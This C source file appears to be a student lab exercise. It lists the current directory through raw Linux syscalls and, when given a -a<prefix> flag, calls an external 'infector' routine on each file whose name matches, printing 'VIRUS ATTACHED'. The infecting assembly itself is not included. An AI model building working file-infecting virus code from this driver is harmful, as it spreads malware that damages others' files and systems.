#include "util.h"          // for strlen, strncmp, etc.

extern int system_call();

// Raw syscall numbers
#define SYS_EXIT    1
#define SYS_READ    3
#define SYS_WRITE   4
#define SYS_OPEN    5
#define SYS_CLOSE   6
#define SYS_GETDENTS64 220  

// File access modes
#define O_RDONLY        00000000
#define O_WRONLY        00000001
#define O_RDWR          00000002
#define O_CREAT         00000100
#define O_EXCL          00000200
#define O_TRUNC         00001000
#define O_APPEND        00002000
#define O_DIRECTORY     00200000

#define BUF_SIZE 8192 // <= 10 KB as permitted

// Structure for directory entries in 64-bit Linux
struct linux_dirent64 {
    unsigned long long  d_ino;    // 64-bit inode number
    unsigned long long  d_off;    // 64-bit offset
    unsigned short d_reclen;      // Size of this dirent
    unsigned char  d_type;        // File type
    char           d_name[256];   // Fixed size array
} __attribute__((packed));

// External assembly routines -defined in start.s) 
extern void infection(void);
extern void infector(char *filename);

// syscall wrapper - get the syscall number and up to 5 arguments which are passed in registers
static inline int sys_call(int num,
                           int arg1, int arg2, int arg3,
                           int arg4, int arg5)
{
    int ret;
    __asm__ volatile ("int $0x80"
                      : "=a"(ret)
                      : "a"(num), "b"(arg1), "c"(arg2),
                        "d"(arg3), "S"(arg4), "D"(arg5)
                      : "memory");
    return ret;        /* negative => -errno, exactly like raw syscalls */
}
// Activate sys_call SYS_WRITE for printing a string to stdout
// 1: File descriptor for stdout
// str : Pointer to the string to print
// strlen(str) : number of bytes to write
void print(const char* str) {
    sys_call(SYS_WRITE, 1, (int)str, strlen(str), 0, 0);
}

// In case of an error, print an error message and exit with code 0x66
void print_error_exit() {
    print("Error occurred\n");
    sys_call(SYS_EXIT, 0x66, 0, 0, 0, 0);
}



int main(int argc, char **argv) {
    char *prefix = 0; // Pointer to prefix text, if -a is given
    int i; // Loop variable for command line arguments
    
    // Check for -a flag
    for (i = 1; i < argc; i++) {
        if (strncmp(argv[i], "-a", 2) == 0) {
            prefix = argv[i] + 2; // pointer to prefix text
        }
    }
    
    // Call infection() once if -a supplied
    if (prefix) {
        print(prefix);
        print("\n");
        infection(); // Call infection function in start.s
    }
    
    // Open current directory in read-only mode
    int fd = sys_call(SYS_OPEN, (int)".", O_RDONLY|O_DIRECTORY, 0, 0, 0);
    if (fd < 0) {
        print("Failed to open directory\n");
        print_error_exit();
    }
    print("\n");

    // Read directory entries via getdents64
    char buf[BUF_SIZE] __attribute__((aligned(16)));
    int nread = sys_call(SYS_GETDENTS64, fd, (int)buf, BUF_SIZE, 0, 0);
    if (nread < 0) {
        print("Error in getdents64, code: ");
        print("\n");
        print_error_exit();
    }
    
    
    // Process directory entries
    int pos = 0;
    // Loop through the buffer to read directory entries 
    while (pos < nread) {
        struct linux_dirent64 *d = (struct linux_dirent64 *)(buf + pos);
        char *name = d->d_name;
        
        // Skip "." and ".." entries which are not files to infect
        if (strcmp(name, ".") == 0 || strcmp(name, "..") == 0) {
            print(name);
            print("\n");
            pos += d->d_reclen; // Advance to next entry
            continue;
        }
        
        // Print the filename
        print(name);
        
        // If -a<prefix> given and name starts with prefix so infect 
        if (prefix && strncmp(name, prefix, strlen(prefix)) == 0) {
            print(" VIRUS ATTACHED\n");
            infector(name);
        } else {
            print("\n");
        }
        
        // Advance to next entry
        pos += d->d_reclen;
    }
    
    // Close directory and exit
    sys_call(SYS_CLOSE, fd, 0, 0, 0, 0);
    return 0;
}